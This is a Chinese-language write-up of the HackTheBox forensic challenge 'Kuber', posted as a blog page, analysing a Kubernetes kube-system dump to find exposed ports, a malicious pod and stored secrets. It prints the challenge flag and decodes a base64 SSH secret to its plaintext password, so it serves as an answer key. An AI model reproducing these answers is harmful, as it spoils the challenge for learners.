@@ -1,0 +1,831 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB-Kuber | Wuvoun
+</title>
+<meta
+  name="description"
+  content="少女祈祷中..."
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://wuvoun.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB-Kuber | Wuvoun" />
+  <meta
+    property="og:description"
+    content="少女祈祷中..."
+  />
+  <meta property="og:url" content="https://wuvoun.github.io/post/htb-kuber/" />
+  <meta
+    property="og:site_name"
+    content="Wuvoun"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Wuvoun" />
+  <meta property="article:published_time" content="2025-09-12T22:03:04&#43;08:00" />
+  <meta property="article:modified_time" content="2025-09-12T22:03:04&#43;08:00" /><meta property="article:tag" content="DFIRKubernetes" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon1.ico"><link rel="stylesheet" href="/css/main.min.5a853f279b790b623408299f44544bf0b98ef360d87a9d68d6dcd3848c735f90.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+This article does not have a corresponding language version
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span><a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav"></nav></div>
+<header id="header"><picture></picture><img  fetchpriority="high" src="/images/banner.png" alt="HTB-Kuber"><div id="header-outer">
+    <div id="header-title"><a href="/" id="logo">
+            <h1 data-aos="slide-up">HTB-Kuber</h1>
+          </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          
+          class="sidebar-right"  ><aside id="sidebar"><div class="sidebar-wrapper wrap-sticky">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前置知识">前置知识</a>
+      <ul>
+        <li><a href="#kubernetes-是什么">Kubernetes 是什么？</a></li>
+        <li><a href="#什么是-kube-system-命名空间的转储">什么是 <strong>“kube-system 命名空间的转储”</strong>？</a></li>
+        <li><a href="#什么是-pod">什么是 Pod？</a></li>
+        <li><a href="#文件内容分析">文件内容分析</a></li>
+        <li><a href="#端口映射关系">端口映射关系</a></li>
+      </ul>
+    </li>
+    <li><a href="#题目">题目</a>
+      <ul>
+        <li><a href="#1-at-which-nodeport-is-the">1. <strong>At which NodePort is the <code>ssh-deployment</code> Kubernetes service exposed for external access?</strong></a></li>
+        <li><a href="#2-what-is-the-clusterip-of-the-kubernetes-cluster">2. <strong>What is the ClusterIP of the kubernetes cluster?</strong></a></li>
+        <li><a href="#3-what-is-the-flag-value-inside-ssh-config-configmap">3. <strong>What is the flag value inside ssh-config configmap?</strong></a></li>
+        <li><a href="#4-what-is-the-value-of-password-in-plaintext-which-is-found-inside-ssh-deployment-via-secret">4. <strong>What is the value of password (in plaintext) which is found inside ssh-deployment via secret?</strong></a></li>
+        <li><a href="#5-what-is-the-name-of-the-malicious-pod">5. <strong>What is the name of the malicious pod?</strong></a></li>
+        <li><a href="#6-what-is-the-image-attacker-is-using-to-create-malicious-pod">6. <strong>What is the image attacker is using to create malicious pod?</strong></a></li>
+        <li><a href="#7-whats-the-attacker-ip">7. <strong>Whats the attacker IP?</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/../images/avatar.webp"
+    data-sizes="auto"
+    alt="Wuvoun"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Wuvoun</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">6</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">6</div>
+  </a>
+</div>
+<div class="sidebar-social"></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">About</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div>
+
+  <div class="sidebar-widget"></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-09-12 22:03:04 &#43;0800 CST" itemprop="datePublished"
+      >2025-09-12</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-09-12</time
+    >
+  </span>
+</div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/htb"
+      data-aos="zoom-in"
+      >HTB</a
+    ></div>
+</div>
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="htb-kuber">
+<a class="header-anchor" href="#htb-kuber"></a>
+HTB-Kuber
+</h1><h2 id="前置知识">
+<a class="header-anchor" href="#%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86"></a>
+前置知识
+</h2><h3 id="kubernetes-是什么">
+<a class="header-anchor" href="#kubernetes-%e6%98%af%e4%bb%80%e4%b9%88"></a>
+Kubernetes 是什么？
+</h3><p>Kubernetes（K8s）是一个 <strong>容器编排系统</strong>，用来管理 Docker 容器，它负责应用怎么启动、扩容、自动恢复、网络通信等。</p>
+<h3 id="什么是-kube-system-命名空间的转储">
+<a class="header-anchor" href="#%e4%bb%80%e4%b9%88%e6%98%af-kube-system-%e5%91%bd%e5%90%8d%e7%a9%ba%e9%97%b4%e7%9a%84%e8%bd%ac%e5%82%a8"></a>
+什么是 <strong>“kube-system 命名空间的转储”</strong>？
+</h3><p>在 Kubernetes 里，所有的东西（应用、配置、日志、服务）都会被分门别类，放在一个个“文件夹”里，这个“文件夹”叫 <strong>命名空间（namespace）</strong>。</p>
+<p>其中有一个很重要的系统级文件夹，叫 <strong>kube-system</strong>，它里面存放的是 <strong>Kubernetes 自己运行所需要的核心组件</strong>，比如：</p>
+<ul>
+<li>kube-dns（负责集群里的域名解析）</li>
+<li>kube-proxy（负责流量转发）</li>
+<li>coredns、kube-apiserver、etcd（管理整个集群的数据）</li>
+</ul>
+<h3 id="什么是-pod">
+<a class="header-anchor" href="#%e4%bb%80%e4%b9%88%e6%98%af-pod"></a>
+什么是 Pod？
+</h3><ul>
+<li>在 <strong>Kubernetes</strong> 里，<strong>Pod 是最小的运行单元</strong>。</li>
+<li>一个 Pod 里面可以包含一个或多个 <strong>容器（container）</strong>，这些容器共享同一个网络和存储环境。</li>
+</ul>
+<h3 id="文件内容分析">
+<a class="header-anchor" href="#%e6%96%87%e4%bb%b6%e5%86%85%e5%ae%b9%e5%88%86%e6%9e%90"></a>
+文件内容分析
+</h3><ol>
+<li><strong>00-namespace.yaml</strong>
+<ul>
+<li>定义了 <code>kube-system</code> 这个命名空间本身。</li>
+<li>就像是一个“文件夹的标签”，说明“这里存放的是系统级别的东西”。</li>
+</ul>
+</li>
+<li><strong>configmaps.yaml</strong>
+<ul>
+<li>保存了系统组件的配置信息（比如 DNS 配置、代理规则）。</li>
+<li>攻击者如果能改这个，就可能劫持 DNS，把流量导向恶意服务器。</li>
+</ul>
+</li>
+<li><strong>daemonset.yaml</strong>
+<ul>
+<li>DaemonSet 会在每个节点上跑一个 Pod。</li>
+<li>常用于部署日志收集、网络代理等系统级别的服务。</li>
+<li>如果这里被篡改，攻击者就能在集群所有节点“同时种马”。</li>
+</ul>
+</li>
+<li><strong>deployment.yaml</strong>
+<ul>
+<li>定义了集群里需要长期运行的一些服务（比如 <code>coredns</code>、<code>metrics-server</code>）。</li>
+<li>如果有人改了 Deployment，可能会植入恶意镜像。</li>
+</ul>
+</li>
+<li><strong>job.yaml</strong>
+<ul>
+<li>定义了临时运行的批处理任务（Job）。</li>
+<li>如果你看到奇怪的 Job（比如下载脚本、curl 外部地址），那可能是入侵的迹象。</li>
+</ul>
+</li>
+<li><strong>pods.yaml</strong>
+<ul>
+<li>列出了当前运行的所有 Pod。</li>
+<li>这里是重点！你能看到哪些镜像在跑、镜像从哪拉的（dockerhub、私库还是可疑仓库）。</li>
+<li>恶意 Pod 往往会有异常镜像名，比如 <code>ubuntu:latest</code>，但里面偷偷跑挖矿程序。</li>
+</ul>
+</li>
+<li><strong>secrets.yaml</strong>
+<ul>
+<li>存放了集群里的各种敏感信息（API Token、TLS 证书、密码）。</li>
+<li>如果这些被泄露，黑客完全可以伪装成合法用户操控集群。</li>
+<li>这是最需要重点检查的文件。</li>
+</ul>
+</li>
+<li><strong>service.yaml</strong>
+<ul>
+<li>定义了服务如何暴露（ClusterIP、NodePort、LoadBalancer）。</li>
+<li>如果有 <code>NodePort</code> 暴露在公网，就是潜在攻击入口。</li>
+</ul>
+</li>
+<li><strong>serviceaccount.yaml</strong>
+<ul>
+<li>定义了 Pod 与集群 API 交互用的身份。</li>
+<li>如果某些 ServiceAccount 权限过大（比如 cluster-admin），攻击者拿到就能控制整个集群。</li>
+</ul>
+</li>
+</ol>
+<h3 id="端口映射关系">
+<a class="header-anchor" href="#%e7%ab%af%e5%8f%a3%e6%98%a0%e5%b0%84%e5%85%b3%e7%b3%bb"></a>
+端口映射关系
+</h3><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image.8z6vp597xv.webp" alt="image.png"></p>
+<p>Node和Pod之间有一个Service的中间服务。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NodePort<span style="color:#f92672">(</span>31337<span style="color:#f92672">)</span> → Service → Pod<span style="color:#f92672">(</span>2222<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Service 就是 Kubernetes 的 <strong>“流量调度员”</strong>：</p>
+<ul>
+<li>它会跟踪后端 Pod 的 IP（自动更新）。</li>
+<li>有负载均衡功能，能把流量分发到多个 Pod。</li>
+<li>提供一个固定的入口（ClusterIP / NodePort / LoadBalancer），不管 Pod 怎么变化，都能访问。</li>
+</ul>
+<h2 id="题目">
+<a class="header-anchor" href="#%e9%a2%98%e7%9b%ae"></a>
+题目
+</h2><h3 id="1-at-which-nodeport-is-the">
+<a class="header-anchor" href="#1-at-which-nodeport-is-the"></a>
+1. <strong>At which NodePort is the <code>ssh-deployment</code> Kubernetes service exposed for external access?</strong>
+</h3><p>在<strong>service.yaml中</strong>搜索**<code>ssh-deployment</code> ，找到** <code>nodePort: 31337</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  kind: Service
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    annotations:
+</span></span><span style="display:flex;"><span>      kubectl.kubernetes.io/last-applied-configuration: |
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Service&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;annotations&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;labels&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;app&#34;</span>:<span style="color:#e6db74">&#34;ssh-deployment&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ssh-deployment&#34;</span>,<span style="color:#e6db74">&#34;namespace&#34;</span>:<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;spec&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;ports&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;nodePort&#34;</span>:31337,<span style="color:#e6db74">&#34;port&#34;</span>:2222,<span style="color:#e6db74">&#34;targetPort&#34;</span>:2222<span style="color:#f92672">}]</span>,<span style="color:#e6db74">&#34;selector&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;app&#34;</span>:<span style="color:#e6db74">&#34;ssh-deployment&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;NodePort&#34;</span><span style="color:#f92672">}}</span>
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2024-08-16T14:59:59Z&#34;</span>
+</span></span><span style="display:flex;"><span>    labels:
+</span></span><span style="display:flex;"><span>      app: ssh-deployment
+</span></span><span style="display:flex;"><span>    name: ssh-deployment
+</span></span><span style="display:flex;"><span>    namespace: kube-system
+</span></span><span style="display:flex;"><span>  spec:
+</span></span><span style="display:flex;"><span>    clusterIP: 10.43.191.212
+</span></span><span style="display:flex;"><span>    clusterIPs:
+</span></span><span style="display:flex;"><span>    - 10.43.191.212
+</span></span><span style="display:flex;"><span>    externalTrafficPolicy: Cluster
+</span></span><span style="display:flex;"><span>    internalTrafficPolicy: Cluster
+</span></span><span style="display:flex;"><span>    ipFamilies:
+</span></span><span style="display:flex;"><span>    - IPv4
+</span></span><span style="display:flex;"><span>    ipFamilyPolicy: SingleStack
+</span></span><span style="display:flex;"><span>    ports:
+</span></span><span style="display:flex;"><span>    - nodePort: <span style="color:#ae81ff">31337</span>
+</span></span><span style="display:flex;"><span>      port: <span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>      protocol: TCP
+</span></span><span style="display:flex;"><span>      targetPort: <span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>    selector:
+</span></span><span style="display:flex;"><span>      app: ssh-deployment
+</span></span><span style="display:flex;"><span>    sessionAffinity: None
+</span></span><span style="display:flex;"><span>    type: NodePort
+</span></span><span style="display:flex;"><span>  status:
+</span></span><span style="display:flex;"><span>    loadBalancer: <span style="color:#f92672">{}</span>
+</span></span></code></pre></div><h3 id="2-what-is-the-clusterip-of-the-kubernetes-cluster">
+<a class="header-anchor" href="#2-what-is-the-clusterip-of-the-kubernetes-cluster"></a>
+2. <strong>What is the ClusterIP of the kubernetes cluster?</strong>
+</h3><p>同第一题，找到 <code>clusterIP: 10.43.191.212</code></p>
+<h3 id="3-what-is-the-flag-value-inside-ssh-config-configmap">
+<a class="header-anchor" href="#3-what-is-the-flag-value-inside-ssh-config-configmap"></a>
+3. <strong>What is the flag value inside ssh-config configmap?</strong>
+</h3><p>在<strong>configmaps.yaml 文件里查找ssh-config ，找到 <code>HTB{1d2d2b861c5f8631f841b57f327f46f8}</code> 标志</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  data:
+</span></span><span style="display:flex;"><span>    FLAG: HTB<span style="color:#f92672">{</span>1d2d2b861c5f8631f841b57f327f46f8<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    PASSWORD_ACCESS: <span style="color:#e6db74">&#34;true&#34;</span>
+</span></span><span style="display:flex;"><span>    PGID: <span style="color:#e6db74">&#34;1000&#34;</span>
+</span></span><span style="display:flex;"><span>    PUID: <span style="color:#e6db74">&#34;1000&#34;</span>
+</span></span><span style="display:flex;"><span>    SUDO_ACCESS: <span style="color:#e6db74">&#34;true&#34;</span>
+</span></span><span style="display:flex;"><span>    TZ: Europe/London
+</span></span><span style="display:flex;"><span>    USER_NAME: admin
+</span></span><span style="display:flex;"><span>  kind: ConfigMap
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    annotations:
+</span></span><span style="display:flex;"><span>      kubectl.kubernetes.io/last-applied-configuration: |
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;FLAG&#34;</span>:<span style="color:#e6db74">&#34;HTB{1d2d2b861c5f8631f841b57f327f46f8}&#34;</span>,<span style="color:#e6db74">&#34;PASSWORD_ACCESS&#34;</span>:<span style="color:#e6db74">&#34;true&#34;</span>,<span style="color:#e6db74">&#34;PGID&#34;</span>:<span style="color:#e6db74">&#34;1000&#34;</span>,<span style="color:#e6db74">&#34;PUID&#34;</span>:<span style="color:#e6db74">&#34;1000&#34;</span>,<span style="color:#e6db74">&#34;SUDO_ACCESS&#34;</span>:<span style="color:#e6db74">&#34;true&#34;</span>,<span style="color:#e6db74">&#34;TZ&#34;</span>:<span style="color:#e6db74">&#34;Europe/London&#34;</span>,<span style="color:#e6db74">&#34;USER_NAME&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;ConfigMap&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;annotations&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ssh-config&#34;</span>,<span style="color:#e6db74">&#34;namespace&#34;</span>:<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">}}</span>
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2024-08-16T14:58:51Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: ssh-config
+</span></span><span style="display:flex;"><span>    namespace: kube-system
+</span></span><span style="display:flex;"><span>kind: List
+</span></span><span style="display:flex;"><span>metadata:
+</span></span></code></pre></div><h3 id="4-what-is-the-value-of-password-in-plaintext-which-is-found-inside-ssh-deployment-via-secret">
+<a class="header-anchor" href="#4-what-is-the-value-of-password-in-plaintext-which-is-found-inside-ssh-deployment-via-secret"></a>
+4. <strong>What is the value of password (in plaintext) which is found inside ssh-deployment via secret?</strong>
+</h3><p>查找 <strong><code>secrets.yaml</code> ,搜索ssh</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>- apiVersion: v1
+</span></span><span style="display:flex;"><span>  data:
+</span></span><span style="display:flex;"><span>    USER_PASSWORD: U3VwZXJDcmF6eVBhc3N3b3JkMTIzIQ<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>  kind: Secret
+</span></span><span style="display:flex;"><span>  metadata:
+</span></span><span style="display:flex;"><span>    annotations:
+</span></span><span style="display:flex;"><span>      kubectl.kubernetes.io/last-applied-configuration: |
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;USER_PASSWORD&#34;</span>:<span style="color:#e6db74">&#34;U3VwZXJDcmF6eVBhc3N3b3JkMTIzIQ==&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Secret&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;annotations&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;ssh-secret&#34;</span>,<span style="color:#e6db74">&#34;namespace&#34;</span>:<span style="color:#e6db74">&#34;kube-system&#34;</span><span style="color:#f92672">}}</span>
+</span></span><span style="display:flex;"><span>    creationTimestamp: <span style="color:#e6db74">&#34;2024-08-16T14:58:46Z&#34;</span>
+</span></span><span style="display:flex;"><span>    name: ssh-secret
+</span></span><span style="display:flex;"><span>    namespace: kube-system
+</span></span><span style="display:flex;"><span>  type: Opaque
+</span></span></code></pre></div><p>base64解码，密码为 <code>SuperCrazyPassword123!</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;U3VwZXJDcmF6eVBhc3N3b3JkMTIzIQ==&#39;</span> |base64 -d
+</span></span><span style="display:flex;"><span>SuperCrazyPassword123!#
+</span></span></code></pre></div><h3 id="5-what-is-the-name-of-the-malicious-pod">
+<a class="header-anchor" href="#5-what-is-the-name-of-the-malicious-pod"></a>
+5. <strong>What is the name of the malicious pod?</strong>
+</h3><p>列出所有pod。</p>
+<p>pod命名，ssh-deployment-7798d8ff 这段是一定的，前半部分为服务名，第二段为id。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat pods.yaml | yq <span style="color:#e6db74">&#34;.items[].metadata.name&#34;</span>
+</span></span><span style="display:flex;"><span>coredns-576bfc4dc7-8smfq
+</span></span><span style="display:flex;"><span>helm-install-traefik-crd-9p2f5
+</span></span><span style="display:flex;"><span>helm-install-traefik-qnnmv
+</span></span><span style="display:flex;"><span>local-path-provisioner-6795b5f9d8-k6kk2
+</span></span><span style="display:flex;"><span>metrics-server-557ff575fb-4q62w
+</span></span><span style="display:flex;"><span>metrics-server-557ff575fx-4q62x
+</span></span><span style="display:flex;"><span>ssh-deployment-7798d8ff-47tlh
+</span></span><span style="display:flex;"><span>ssh-deployment-7798d8ff-pn7bk
+</span></span><span style="display:flex;"><span>ssh-deployment-7798d8ff-vkzfq
+</span></span><span style="display:flex;"><span>svclb-traefik-f7c6ca30-2h7wt
+</span></span><span style="display:flex;"><span>traefik-5fb479b77-j8kq9
+</span></span></code></pre></div><p>metrics-server有两个id</p>
